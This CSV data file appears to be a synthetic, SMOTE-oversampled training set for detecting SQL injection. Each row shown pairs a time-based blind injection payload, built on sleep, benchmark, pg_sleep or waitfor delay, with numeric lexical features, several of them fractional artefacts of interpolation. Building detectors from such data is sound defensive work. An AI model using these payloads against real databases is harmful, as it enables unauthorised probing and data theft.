id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000124,attack,time,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000129,0.8210181853071044,102.65561980637119,29.0,3.8225686488784345,27.763482884804116,27.473034230391768,37.419102691175304,10.0,0.27078790032882494,0.26760861042331746,0.36411139152725913,0.09749209772059847,0.7634828848041159,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.236517115195884,0.0,0.0,1.0,2.0,0.7634828848041159,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.2365171151958842,0.763482884804116,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000054,0.04911667835390487,68.83439134534126,22.976341620763037,3.4757150005225506,23.047316758473926,3.9881708103815185,28.84622053495975,12.952683241526074,0.33519732684897274,0.05793049289458756,0.4187593854801912,0.18811279477624843,2.0,3.988170810381519,0.0,0.0,0.0,0.9881708103815189,0.0,3.9763416207630375,0.0,0.0,0.0,0.9881708103815188,1.0,1.0,0.0,0.0,0.0,0.9881708103815188,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000126,attack,time,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000028,0.5887527239488007,97.1255315582192,28.446504508317027,3.776183868964807,21.339513524951084,29.0,35.786018033268114,11.0,0.2190113908767748,0.2995823074085543,0.36777163338728824,0.11363466832738267,0.0,0.7767477458414861,2.0,0.0,0.0,2.0,0.0,5.223252254158514,0.0,0.0,1.0,4.0,0.0,0.7767477458414861,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000127,attack,time,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000097,0.4604876561306754,83.27401750092231,27.0,3.3115824002468144,20.0,10.0,40.419214000737846,12.854803500184461,0.24028325044929985,0.12014162522464993,0.4852289419114172,0.15434618241463302,0.8548035001844618,0.14519649981553817,2.0,0.0,0.0,1.0,0.0,6.854803500184461,1.0,1.0,0.0,3.0,0.8548035001844618,0.1451964998155382,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000128,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000006,0.032229996734150945,49.21423479657817,20.0,3.2806198258192425,13.0,10.0,20.17852899714848,6.035705799429696,0.26437435518383534,0.20336488860295024,0.409656482077187,0.12260427413602745,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.035705799429696,0.0,0.0,1.0,2.220446049250313e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000129,attack,time,"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000304,0.7541581304245574,104.67459467109677,28.0,3.3387840333252647,33.0,10.0,49.0,12.674594671096775,0.31526908203789433,0.0955360854660286,0.4681268187835401,0.12106801371253695,0.0,0.6745946710967754,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,2.0,0.0,0.6745946710967756,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000130,attack,time,select pg_sleep  (  5   )    )   +',nearest_attack_euclidean,R000294,1.8153739914307496,31.301325513732962,13.53766568921662,2.9179076447339676,10.6883284460831,1.4623343107833797,14.075331378433237,5.07533137843324,0.3366923427877037,0.049608862818714655,0.45303356141711004,0.16066523297647156,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.5376656892166197,0.0,0.5376656892166198,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.5376656892166197,0.0,0.0,0.0,0.4623343107833803,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4623343107833803,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4623343107833804
SMOTE_000131,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000039,1.1192348014639764,53.968462356718696,15.617810587944716,2.692595994479702,12.853431763834147,1.3821894120552844,29.204083532608127,10.528757648221138,0.24432510975438165,0.02493707005727132,0.5371259164515573,0.19361190373678983,0.0,3.382189412055285,0.0,0.0,0.0,1.0,0.0,4.764378824110569,1.3821894120552842,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6178105879447158,0.0,0.0,0.0,1.3821894120552844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000132,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000072,1.5061454418209235,54.211575351417835,21.79565924321831,3.631821431099219,18.21157535141784,7.788424648582161,19.605787675708918,8.60578767570892,0.3325412803758864,0.1495122393526401,0.3609461000783097,0.15700038019316384,3.2043407567816895,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.4014469189272303,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000133,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000173,0.3689600915977833,102.93154349576331,27.465771747881654,3.304546845007573,32.465771747881654,9.893154349576331,48.67946304872899,11.893154349576331,0.31523110949462996,0.09611012862093958,0.4730992763681887,0.11555948551624169,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.893154349576331,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.8931543495763311,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.893154349576331
SMOTE_000134,attack,time,1   )    )    as hxtp where 5478  =  5478 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000207,1.1098510701121063,105.46226216160792,30.386786484823766,3.6420893235783303,31.0,18.0,45.0,11.462262161607923,0.29395057259570123,0.1706809776362136,0.426702444090534,0.10866600567755119,0.0,0.46226216160792216,2.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,0.0,4.0,0.0,0.46226216160792216,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000135,attack,time,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm,nearest_attack_euclidean,R000065,0.09839414814964248,124.83621638455088,24.167243276910177,3.0591559811297873,42.0,2.0,63.66897310764071,17.167243276910177,0.3365959865099219,0.016028380309996274,0.5098863163890672,0.13748931679101448,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,12.167243276910177,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000136,attack,time,"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000297,0.40162510201842955,55.37059596306324,18.0,2.9827466669343115,10.0,10.0,27.496476770450585,7.874119192612646,0.18077522421896627,0.18077522421896627,0.49629762331213667,0.14215192824993078,0.1258808073873534,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.874119192612646,0.0,0.0,1.0,1.0,0.1258808073873533,0.0,0.0,0.8741191926126465,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000137,attack,time,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000081,1.15140511876873,111.8189258247792,24.5452685438052,3.005330908363637,32.03017902920347,2.0,58.81892582477919,18.969820970796533,0.28774979412199025,0.017937491873236455,0.5246564653592338,0.1696562486455394,0.0,4.0,0.0,0.0,1.0,1.0,0.0,10.969820970796533,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.4849104853982662,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.484910485398267
SMOTE_000138,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000229,0.5502257452334849,82.55330565616306,21.521255189469425,3.0278249939920694,27.84041839648981,2.0,41.23414244914268,11.478744810530575,0.3390287647586743,0.024335076652040863,0.49780631189336655,0.13882984669591827,1.0,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.478744810530575,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.8404183964898084,0.15958160351019166,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000139,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000164,0.16792672529798583,56.34501246136075,19.0,3.207295340398979,22.230008307573833,1.0,25.115004153786916,8.0,0.3943808154015548,0.017757772908594247,0.445799228421097,0.14206218326875403,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.9424979231065418,0.0,4.057502076893458,0.0,0.0,0.0,0.9424979231065418,1.0,0.0,0.0,0.0,0.0,0.9424979231065417,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000140,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000173,0.1316263984383196,104.0567943641369,28.0,3.326606458554749,33.0,10.0,49.0,12.056794364136906,0.31713606098749836,0.0961018366628783,0.4708989996481036,0.11586310270151973,0.0,0.05679436413690642,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,2.0,0.0,0.05679436413690642,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000141,attack,time,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000230,0.6575368500744408,117.7516728438921,23.2483271561079,2.8621058274875066,30.751672843892102,2.0,65.0,20.0,0.26114700401409624,0.016985126344503526,0.5520166061963648,0.16985126344503534,0.0,4.0,0.0,0.0,1.0,1.0,0.0,12.0,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.7516728438920997,0.24832715610790035,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000142,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000146,1.2551280856282738,70.0,22.0,3.529303039104296,27.0,4.0,27.0,12.0,0.38571428571428573,0.057142857142857134,0.38571428571428573,0.17142857142857143,4.877944105704438,1.1220558942955616,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.2805139735738904,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000143,attack,time,"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000074,0.6763113086777782,87.90259029558588,20.82931151302454,2.9395663742214957,27.621983634768405,2.0,45.073278782561346,13.207327878256134,0.3146165978579317,0.022839550731886885,0.5119925506604304,0.15055130074975104,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.41465575651227,0.7926721217438653,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.7926721217438653,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.792672121743865
SMOTE_000144,attack,time,select sleep  (  5  )  --,nearest_attack_euclidean,R000177,0.0003414295985425712,24.999755791672662,10.99991859722422,2.942673452245619,10.999999999999998,1.0,8.99991859722422,3.9998371944484417,0.44000488416654676,0.04000044401514062,0.36000029601009376,0.1599943758082189,0.0,-1.1102230246251565e-16,1.999837194448442,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.9998371944484417,0.0,0.0,0.999918597224221,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000145,attack,time,"1' in boolean mode  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000237,0.24598214736599266,89.37710400194283,29.844276000485706,3.898607992676457,27.98779400315709,21.0,31.23358599927144,9.155723999514294,0.31232594095227595,0.2351058016204879,0.34990955499650434,0.10265870243073184,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.077861999757147,0.0778619997571467,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000146,attack,time,"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000295,0.1430939392669783,92.75890589857222,28.939726474643056,3.7888539537090256,20.0,29.0,33.75890589857223,10.0,0.21563632741676397,0.31267267475430777,0.3638728341205463,0.10781816370838199,0.0,0.06027352535694286,2.0,0.0,0.0,2.0,0.0,4.939726474643057,0.0,0.0,1.0,4.0,0.0,0.06027352535694297,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,time,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,nearest_attack_euclidean,R000270,0.2048382976842252,60.72162770936515,19.0,3.2336735822968454,26.0,1.0,25.977302167492116,7.744325541873028,0.4287599546000301,0.016490767484616545,0.42730865484766617,0.12744062306768722,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.744325541873029,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000148,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000037,1.122308934969555,87.65153843893108,22.584278847566807,3.0060235592949724,28.0,2.0,44.8200961340647,12.831442304866385,0.32197491710702936,0.022998208364787817,0.5084660541861943,0.14656082034198856,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.247163457299578,0.5842788475668071,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000149,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000102,1.4730461226273421,84.78319501106107,28.46853388765988,3.9483391601289806,28.34266943829941,18.72026278638083,27.65733056170059,10.062932224680235,0.3368166446237444,0.21922374968322333,0.3255627204577978,0.11839688523523445,3.531466112340118,-1.1102230246251565e-16,0.0,0.0,0.0,1.531466112340118,0.0,4.0,0.0,0.0,1.0,1.531466112340118,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.4685338876598821,0.0,0.0,0.0,1.531466112340118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000150,attack,time,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000230,0.8997883307170692,117.66018349049068,23.339816509509316,2.8615578867691944,30.660183490490684,2.0,65.0,20.0,0.2605704739731051,0.01699837990866425,0.552447347031588,0.1699837990866425,0.0,4.0,0.0,0.0,1.0,1.0,0.0,12.0,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.6601834904906827,0.3398165095093172,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000151,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000103,0.07917493970100475,85.25383400144769,26.03172925018096,3.5032298792588024,21.0,18.0,36.19037550108576,10.063458500361921,0.24638450170393406,0.21118671574622916,0.42442047989123,0.11800830265860676,0.0,0.03172925018096051,2.0,0.0,0.0,2.0,0.0,5.031729250180961,0.0,0.0,1.0,4.0,0.0,0.031729250180960455,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000152,attack,time,"1%""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000137,0.13744558188019082,117.14423626783672,27.057694507134688,3.2122619251060875,18.230778028538758,21.971152746432654,58.0,18.94230549286531,0.15555589018621083,0.18757542899258883,0.4951404158936157,0.1617282649275847,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,1.9423054928653107,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.9711527464326555,0.028847253567344522,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000153,attack,time,1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000210,0.6778048868448443,70.47684036185372,26.564811531958206,3.572032180983796,20.0,10.0,30.12962306391641,10.347217297937307,0.28428700700062515,0.14214350350031257,0.42725444644968297,0.14631504304937934,0.7824057659791025,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.782405765979102,0.7824057659791025,1.0,0.0,3.0,0.7824057659791025,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000154,attack,time,select sleep  (  5  )  #,nearest_attack_euclidean,R000069,1.7385545367774078,24.91952724355056,11.459763621775279,2.804349086188296,9.620709134674163,1.4597636217752807,10.839054487101116,2.999999999999999,0.3890740697966727,0.057876281536948945,0.43247045272190987,0.12057919594446848,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.4597636217752794,0.0,0.0,0.0,2.220446049250313e-16,0.0,0.0,0.0,0.5402363782247208,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.5402363782247209,0.0,0.0,0.0,0.4597636217752792,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
